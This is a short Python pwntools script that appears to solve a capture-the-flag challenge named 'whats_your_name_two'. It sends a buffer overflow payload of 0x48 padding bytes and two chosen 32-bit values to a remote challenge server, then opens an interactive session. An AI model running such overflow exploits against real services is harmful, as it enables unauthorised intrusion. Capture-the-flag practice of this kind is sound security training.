import pwn
elf = pwn.ELF('./whats_your_name_two')
payload = b"A"*0x48
payload += pwn.p32(0x534b544e)
payload += pwn.p32(0x5445454c)
# io = elf.process()
io = pwn.remote("198.211.115.81", 10002)
io.sendline(payload)
io.interactive()
